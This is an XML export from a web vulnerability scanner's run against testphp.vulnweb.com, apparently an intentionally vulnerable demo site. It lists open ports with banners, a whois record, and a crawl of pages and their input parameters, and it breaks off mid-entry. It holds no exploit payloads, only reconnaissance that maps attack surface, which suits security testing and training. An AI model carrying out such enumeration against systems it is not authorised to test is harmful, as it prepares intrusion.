<?xml version="1.0"?>
<ScanGroup ExportedOn="14/7/2016, 11:32">
 <Scan>
  <Name><![CDATA[Scan Thread 1 ( http://testphp.vulnweb.com:80/ )]]></Name>
  <ShortName><![CDATA[Scan Thread 1]]></ShortName>
  <StartURL><![CDATA[http://testphp.vulnweb.com:80/]]></StartURL>
  <StartTime><![CDATA[14/7/2016, 10:49:50]]></StartTime>
  <FinishTime><![CDATA[14/7/2016, 11:31:05]]></FinishTime>
  <ScanTime><![CDATA[41 minutes, 14 seconds]]></ScanTime>
  <Aborted><![CDATA[False]]></Aborted>
  <Responsive><![CDATA[True]]></Responsive>
  <Banner><![CDATA[nginx/1.4.1]]></Banner>
  <Os><![CDATA[Unknown]]></Os>
  <WebServer><![CDATA[nginx]]></WebServer>
  <Technologies><![CDATA[PHP]]></Technologies>
  <KBase>
    <KBItem>
     <Name><![CDATA[Possible registration page]]></Name>
     <Text><![CDATA[A page where is possible to register a new user account was found at [dark]/signup.php[/dark].]]></Text>
     <References>
     </References>
    </KBItem>
    <KBItem>
     <Name><![CDATA[List of open TCP ports]]></Name>
     <Text><![CDATA[[p]Open Port [bold][dark]22[/dark] / ssh [/bold][break] Port Banner: [pre]SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu7.1
[/pre][/p][hr][p]Open Port [bold][dark]21[/dark] / ftp [/bold][break] Port Banner: [pre]220 ProFTPD 1.3.3e Server (ProFTPD) [176.28.50.165]
[/pre][/p][hr][p]Open Port [bold][dark]53[/dark] / domain [/bold][break] No port banner available.[/p][hr][p]Open Port [bold][dark]80[/dark] / http [/bold][break] Port Banner: [pre]HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:04 GMT
Content-Type: text/html
Connection: close
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2

&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;
&quot;http://www.w3.org/TR/h ...[/pre][/p][hr][p]Open Port [bold][dark]106[/dark] / pop3pw [/bold][break] Port Banner: [pre]200 poppassd hello, who are you?
[/pre][/p][hr][p]Open Port [bold][dark]110[/dark] / pop3 [/bold][break] Port Banner: [pre]+OK Hello there. &lt;23944.1468457407@localhost.localdomain&gt;
[/pre][/p][hr][p]Open Port [bold][dark]143[/dark] / imap [/bold][break] Port Banner: [pre]* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA AUTH=CRAM-MD5 AUTH=PLAIN IDLE ACL ACL2=UNION STARTTLS]
[/pre][/p][hr][p]Open Port [bold][dark]993[/dark] / imaps [/bold][break] No port banner available.[/p][hr][p]Open Port [bold][dark]995[/dark] / pop3s [/bold][break] No port banner available.[/p][hr][p]Open Port [bold][dark]8443[/dark] / https-alt [/bold][break] Port Banner: [pre]HTTP/1.0 404 Not Found
Connection: close
Expires: Sat, 13 Aug 2016 00:53:37 GMT
Cache-Control: max-age=2592000
Content-Type: text/html
Content-Length: 345
Date: Thu, 14 Jul 2016 00:53:37 GMT
Server: sw-cp-server

&lt;?xml version=&quot;1.0&quot; encoding ...[/pre][/p]]]></Text>
     <References>
     </References>
    </KBItem>
    <KBItem>
     <Name><![CDATA[DNS server running]]></Name>
     <Text><![CDATA[A DNS server is running on UDP port 53.]]></Text>
     <References>
     </References>
    </KBItem>
    <KBItem>
     <Name><![CDATA[DNS server running on TCP]]></Name>
     <Text><![CDATA[A DNS server is running on TCP port 53.]]></Text>
     <References>
     </References>
    </KBItem>
    <KBItem>
     <Name><![CDATA[FTP server running]]></Name>
     <Text><![CDATA[An FTP server is running on TCP port 21.]]></Text>
     <References>
     </References>
    </KBItem>
    <KBItem>
     <Name><![CDATA[Whois lookup]]></Name>
     <Text><![CDATA[Whois result for IP address 176.28.50.165:[break][pre]% This is the RIPE Database query service.
% The objects are in RPSL format.
%
% The RIPE Database is subject to Terms and Conditions.
% See http://www.ripe.net/db/support/db-terms-conditions.pdf

% Note: this output has been filtered.
%       To receive output for a database update, use the &quot;-B&quot; flag.

% Information related to '176.28.48.0 - 176.28.55.255'

% Abuse contact for '176.28.48.0 - 176.28.55.255' is 'abuse@hosteurope.de'

inetnum:        176.28.48.0 - 176.28.55.255
remarks:        INFRA-AW
netname:        DE-HE-RS-CLIENTS-176-28-48-NET
descr:          Host Europe GmbH
country:        DE
admin-c:        HM5126-RIPE
tech-c:         HM5126-RIPE
status:         ASSIGNED PA
mnt-by:         MNT-HEG-MASS
created:        2012-01-06T16:03:11Z
last-modified:  2015-12-01T15:01:32Z
source:         RIPE # Filtered

role:           HEG Mass
address:        HEG Mass
address:        Daimler Strasse 9-11
address:        50354 Huerth
address:        Germany
phone:          +49 2203 1045 0
admin-c:        JUPP
admin-c:        OUZO
tech-c:         JUPP
tech-c:         OUZO
nic-hdl:        HM5126-RIPE
mnt-by:         MNT-HEG-MASS
created:        2015-11-05T11:32:14Z
last-modified:  2015-12-07T15:15:08Z
source:         RIPE # Filtered

% Information related to '176.28.0.0/18AS20773'

route:          176.28.0.0/18
descr:          DE-HEC-176-28-SLASH-18
origin:         AS20773
member-of:      AS20773:RS-HOSTEUROPE
mnt-by:         HOSTEUROPE-MNT
created:        2011-05-20T09:01:44Z
last-modified:  2011-05-20T09:01:44Z
source:         RIPE # Filtered

% This query was served by the RIPE Database Query Service version 1.87.4 (DB-1)



[/pre]]]></Text>
     <References>
     </References>
    </KBItem>
    <KBItem>
     <Name><![CDATA[POP3 server running]]></Name>
     <Text><![CDATA[A POP3 server is running on TCP port 110.]]></Text>
     <References>
     </References>
    </KBItem>
    <KBItem>
     <Name><![CDATA[SSH server running]]></Name>
     <Text><![CDATA[A SSH server is running on TCP port 22.[break]SSH server information: [pre]Server key fingerprint: a17dbd2c5d9f0226da5291c02d202f3c
SSH version: SSH2
Encryption algorithm client to server: AES128 CTR
Encryption algorithm server to client: AES128 CTR
Mac algorithm client to server: HMAC with SHA-256 digest
Mac algorithm server to client: HMAC with SHA-256 digest
Public key algorithm: Certificate is signed using RSA digital signature with MD2 digest
[/pre]]]></Text>
     <References>
     </References>
    </KBItem>
    <KBItem>
     <Name><![CDATA[List of file extensions]]></Name>
     <Text><![CDATA[File extensions can provide information on what technologies are being used on this website.[break] List of file extensions detected:[break][break][ul][li][dark]php[/dark] =&gt; [bold]29[/bold] file(s)[/li][li][dark]css[/dark] =&gt; [bold]3[/bold] file(s)[/li][li][dark]swf[/dark] =&gt; [bold]1[/bold] file(s)[/li][li][dark]fla[/dark] =&gt; [bold]1[/bold] file(s)[/li][li][dark]htaccess[/dark] =&gt; [bold]1[/bold] file(s)[/li][li][dark]xml[/dark] =&gt; [bold]7[/bold] file(s)[/li][li][dark]tn[/dark] =&gt; [bold]8[/bold] file(s)[/li][li][dark]LOG[/dark] =&gt; [bold]1[/bold] file(s)[/li][li][dark]bak[/dark] =&gt; [bold]2[/bold] file(s)[/li][li][dark]txt[/dark] =&gt; [bold]2[/bold] file(s)[/li][li][dark]html[/dark] =&gt; [bold]2[/bold] file(s)[/li][li][dark]iml[/dark] =&gt; [bold]1[/bold] file(s)[/li][li][dark]sql[/dark] =&gt; [bold]1[/bold] file(s)[/li][li][dark]Log[/dark] =&gt; [bold]1[/bold] file(s)[/li][/ul]]]></Text>
     <References>
     </References>
    </KBItem>
    <KBItem>
     <Name><![CDATA[List of client scripts]]></Name>
     <Text><![CDATA[These files contain Javascript code referenced from the website.[break][break][ul][li][bold]/medias/js/common_functions.js[/bold][/li][/ul]]]></Text>
     <References>
     </References>
    </KBItem>
    <KBItem>
     <Name><![CDATA[List of files with inputs]]></Name>
     <Text><![CDATA[These files have at least one input (GET or POST).[break][break][ul][li][bold]/[/bold] - [dark][bold] 1 [/bold][/dark] inputs[/li][li][bold]/search.php[/bold] - [dark][bold] 1 [/bold][/dark] inputs[/li][li][bold]/hpp[/bold] - [dark][bold] 1 [/bold][/dark] inputs[/li][li][bold]/hpp/params.php[/bold] - [dark][bold] 2 [/bold][/dark] inputs[/li][li][bold]/cart.php[/bold] - [dark][bold] 1 [/bold][/dark] inputs[/li][li][bold]/artists.php[/bold] - [dark][bold] 1 [/bold][/dark] inputs[/li][li][bold]/userinfo.php[/bold] - [dark][bold] 1 [/bold][/dark] inputs[/li][li][bold]/guestbook.php[/bold] - [dark][bold] 1 [/bold][/dark] inputs[/li][li][bold]/AJAX/showxml.php[/bold] - [dark][bold] 1 [/bold][/dark] inputs[/li][li][bold]/AJAX/infoartist.php[/bold] - [dark][bold] 1 [/bold][/dark] inputs[/li][li][bold]/AJAX/infocateg.php[/bold] - [dark][bold] 1 [/bold][/dark] inputs[/li][li][bold]/AJAX/infotitle.php[/bold] - [dark][bold] 1 [/bold][/dark] inputs[/li][li][bold]/product.php[/bold] - [dark][bold] 1 [/bold][/dark] inputs[/li][li][bold]/showimage.php[/bold] - [dark][bold] 2 [/bold][/dark] inputs[/li][li][bold]/listproducts.php[/bold] - [dark][bold] 2 [/bold][/dark] inputs[/li][li][bold]/redir.php[/bold] - [dark][bold] 1 [/bold][/dark] inputs[/li][li][bold]/secured/newuser.php[/bold] - [dark][bold] 1 [/bold][/dark] inputs[/li][li][bold]/comment.php[/bold] - [dark][bold] 3 [/bold][/dark] inputs[/li][/ul]]]></Text>
     <References>
     </References>
    </KBItem>
    <KBItem>
     <Name><![CDATA[List of external hosts]]></Name>
     <Text><![CDATA[These hosts were linked from this website but they were not scanned because they are not listed in the list of hosts allowed. (Configuration-&gt; Scan Settings -&gt;Scanning Options-&gt; List of hosts allowed).[break][break][ul][li][bold]www.acunetix.com[/bold][/li][li][bold]www.eclectasy.com[/bold][/li][li][bold]download.macromedia.com[/bold][/li][li][bold]blog.mindedsecurity.com[/bold][/li][/ul]]]></Text>
     <References>
     </References>
    </KBItem>
  </KBase>
  <Crawler StartUrl="http://testphp.vulnweb.com/">
   <Cookies>
     <Variable Name="mycookie" Type="Cookie">
     </Variable>
     <Variable Name="login" Type="Cookie">
     </Variable>
   </Cookies>
   <SiteFiles>
     <SiteFile id="1">
      <Name></Name>
      <URL>/</URL>
      <FullURL>http://testphp.vulnweb.com/</FullURL>
      <Inputs>
       <Variable Name="Host" Type="HTTP Header">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="2">
      <Name>search.php</Name>
      <URL>/search.php</URL>
      <FullURL>http://testphp.vulnweb.com/search.php</FullURL>
      <Inputs>
       <Variable Name="test" Type="URL encoded GET">
       </Variable>
       <Variable Name="" Type="URL encoded POST">
       </Variable>
       <Variable Name="searchFor" Type="URL encoded POST">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/search.php?test=query</URL>
         <PostData><![CDATA[goButton=go&amp;searchFor=]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/search.php?test=query</URL>
         <PostData><![CDATA[goButton=go&amp;searchFor=the]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="3">
      <Name>hpp</Name>
      <URL>/hpp/</URL>
      <FullURL>http://testphp.vulnweb.com/hpp/</FullURL>
      <Inputs>
       <Variable Name="pp" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/hpp/?pp=12</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="4">
      <Name>params.php</Name>
      <URL>/hpp/params.php</URL>
      <FullURL>http://testphp.vulnweb.com/hpp/params.php</FullURL>
      <Inputs>
       <Variable Name="" Type="URL encoded GET">
       </Variable>
       <Variable Name="p" Type="URL encoded GET">
       </Variable>
       <Variable Name="pp" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/hpp/params.php?aaaa=</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/hpp/params.php?p=valid&amp;pp=12</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="5">
      <Name>test.php</Name>
      <URL>/hpp/test.php</URL>
      <FullURL>http://testphp.vulnweb.com/hpp/test.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="6">
      <Name>cart.php</Name>
      <URL>/cart.php</URL>
      <FullURL>http://testphp.vulnweb.com/cart.php</FullURL>
      <Inputs>
       <Variable Name="addcart" Type="URL encoded POST">
       </Variable>
       <Variable Name="price" Type="URL encoded POST">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/cart.php</URL>
         <PostData><![CDATA[addcart=2&amp;price=800]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/cart.php</URL>
         <PostData><![CDATA[addcart=3&amp;price=986]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/cart.php</URL>
         <PostData><![CDATA[addcart=4&amp;price=1000]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="7">
      <Name>index.php</Name>
      <URL>/index.php</URL>
      <FullURL>http://testphp.vulnweb.com/index.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="8">
      <Name>login.php</Name>
      <URL>/login.php</URL>
      <FullURL>http://testphp.vulnweb.com/login.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="9">
      <Name>style.css</Name>
      <URL>/style.css</URL>
      <FullURL>http://testphp.vulnweb.com/style.css</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="10">
      <Name>artists.php</Name>
      <URL>/artists.php</URL>
      <FullURL>http://testphp.vulnweb.com/artists.php</FullURL>
      <Inputs>
       <Variable Name="artist" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/artists.php?artist=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/artists.php?artist=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/artists.php?artist=3</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="11">
      <Name>privacy.php</Name>
      <URL>/privacy.php</URL>
      <FullURL>http://testphp.vulnweb.com/privacy.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="12">
      <Name>userinfo.php</Name>
      <URL>/userinfo.php</URL>
      <FullURL>http://testphp.vulnweb.com/userinfo.php</FullURL>
      <Inputs>
       <Variable Name="pass" Type="URL encoded POST">
       </Variable>
       <Variable Name="uname" Type="URL encoded POST">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/userinfo.php</URL>
         <PostData><![CDATA[pass=g00dPa%24%24w0rD&amp;uname=fkeqqgty]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="13">
      <Name>guestbook.php</Name>
      <URL>/guestbook.php</URL>
      <FullURL>http://testphp.vulnweb.com/guestbook.php</FullURL>
      <Inputs>
       <Variable Name="" Type="URL encoded POST">
       </Variable>
       <Variable Name="name" Type="URL encoded POST">
       </Variable>
       <Variable Name="text" Type="URL encoded POST">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/guestbook.php</URL>
         <PostData><![CDATA[submit=add%20message&amp;name=anonymous%20user&amp;text=1]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="14">
      <Name>categories.php</Name>
      <URL>/categories.php</URL>
      <FullURL>http://testphp.vulnweb.com/categories.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="15">
      <Name>Flash</Name>
      <URL>/Flash/</URL>
      <FullURL>http://testphp.vulnweb.com/Flash/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="16">
      <Name>add.swf</Name>
      <URL>/Flash/add.swf</URL>
      <FullURL>http://testphp.vulnweb.com/Flash/add.swf</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="17">
      <Name>add.fla</Name>
      <URL>/Flash/add.fla</URL>
      <FullURL>http://testphp.vulnweb.com/Flash/add.fla</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="18">
      <Name>AJAX</Name>
      <URL>/AJAX/</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="19">
      <Name>index.php</Name>
      <URL>/AJAX/index.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/index.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="20">
      <Name>styles.css</Name>
      <URL>/AJAX/styles.css</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/styles.css</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="21">
      <Name>artists.php</Name>
      <URL>/AJAX/artists.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/artists.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="22">
      <Name>categories.php</Name>
      <URL>/AJAX/categories.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/categories.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="23">
      <Name>titles.php</Name>
      <URL>/AJAX/titles.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/titles.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="24">
      <Name>showxml.php</Name>
      <URL>/AJAX/showxml.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/showxml.php</FullURL>
      <Inputs>
       <Variable Name="text/xml" Type="Custom POST">
       </Variable>
       <Variable Name="xml.node:name" Type="XML">
       </Variable>
       <Variable Name="xml.node#text" Type="XML">
       </Variable>
       <Variable Name="xml.node:name" Type="XML">
       </Variable>
       <Variable Name="xml.node#text" Type="XML">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/showxml.php</URL>
         <PostData><![CDATA[&lt;xml&gt;&lt;node name=&quot;nodename1&quot;&gt;nodetext1&lt;/node&gt;&lt;node name=&quot;nodename2&quot;&gt;nodetext2&lt;/node&gt;&lt;/xml&gt;]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="25">
      <Name>infoartist.php</Name>
      <URL>/AJAX/infoartist.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/infoartist.php</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infoartist.php?id=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infoartist.php?id=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infoartist.php?id=3</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="26">
      <Name>infocateg.php</Name>
      <URL>/AJAX/infocateg.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/infocateg.php</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infocateg.php?id=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infocateg.php?id=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infocateg.php?id=3</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="27">
      <Name>infotitle.php</Name>
      <URL>/AJAX/infotitle.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/infotitle.php</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded POST">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infotitle.php</URL>
         <PostData><![CDATA[id=1]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infotitle.php</URL>
         <PostData><![CDATA[id=2]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infotitle.php</URL>
         <PostData><![CDATA[id=3]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="28">
      <Name>disclaimer.php</Name>
      <URL>/disclaimer.php</URL>
      <FullURL>http://testphp.vulnweb.com/disclaimer.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="29">
      <Name>images</Name>
      <URL>/images/</URL>
      <FullURL>http://testphp.vulnweb.com/images/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="30">
      <Name>Mod_Rewrite_Shop</Name>
      <URL>/Mod_Rewrite_Shop/</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="31">
      <Name>images</Name>
      <URL>/Mod_Rewrite_Shop/images/</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="32">
      <Name>Details</Name>
      <URL>/Mod_Rewrite_Shop/Details</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="33">
      <Name>color-printer</Name>
      <URL>/Mod_Rewrite_Shop/Details/color-printer</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="34">
      <Name>3</Name>
      <URL>/Mod_Rewrite_Shop/Details/color-printer/3/</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="35">
      <Name>web-camera-a4tech</Name>
      <URL>/Mod_Rewrite_Shop/Details/web-camera-a4tech</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="36">
      <Name>2</Name>
      <URL>/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="37">
      <Name>network-attached-storage-dlink</Name>
      <URL>/Mod_Rewrite_Shop/Details/network-attached-storage-dlink</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="38">
      <Name>1</Name>
      <URL>/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="39">
      <Name>.htaccess</Name>
      <URL>/Mod_Rewrite_Shop/.htaccess</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/.htaccess</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="40">
      <Name>product.php</Name>
      <URL>/product.php</URL>
      <FullURL>http://testphp.vulnweb.com/product.php</FullURL>
      <Inputs>
       <Variable Name="pic" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/product.php?pic=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/product.php?pic=3</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/product.php?pic=4</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="41">
      <Name>showimage.php</Name>
      <URL>/showimage.php</URL>
      <FullURL>http://testphp.vulnweb.com/showimage.php</FullURL>
      <Inputs>
       <Variable Name="file" Type="URL encoded GET">
       </Variable>
       <Variable Name="size" Type="URL encoded GET">
       </Variable>
       <Variable Name="file" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg&amp;size=160</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg&amp;size=160</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg&amp;size=160</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg&amp;size=160</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg&amp;size=160</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg&amp;size=160</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg&amp;size=160</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="42">
      <Name>listproducts.php</Name>
      <URL>/listproducts.php</URL>
      <FullURL>http://testphp.vulnweb.com/listproducts.php</FullURL>
      <Inputs>
       <Variable Name="cat" Type="URL encoded GET">
       </Variable>
       <Variable Name="artist" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/listproducts.php?cat=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/listproducts.php?cat=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/listproducts.php?cat=4</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/listproducts.php?artist=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/listproducts.php?artist=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/listproducts.php?artist=3</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="43">
      <Name>signup.php</Name>
      <URL>/signup.php</URL>
      <FullURL>http://testphp.vulnweb.com/signup.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="44">
      <Name>redir.php</Name>
      <URL>/redir.php</URL>
      <FullURL>http://testphp.vulnweb.com/redir.php</FullURL>
      <Inputs>
       <Variable Name="r" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/redir.php?r=http://www.eclectasy.com/Fractal-Explorer/index.html</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="45">
      <Name>Templates</Name>
      <URL>/Templates/</URL>
      <FullURL>http://testphp.vulnweb.com/Templates/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="46">
      <Name>main_dynamic_template.dwt.php</Name>
      <URL>/Templates/main_dynamic_template.dwt.php</URL>
      <FullURL>http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="47">
      <Name>crossdomain.xml</Name>
      <URL>/crossdomain.xml</URL>
      <FullURL>http://testphp.vulnweb.com:80/crossdomain.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="48">
      <Name>secured</Name>
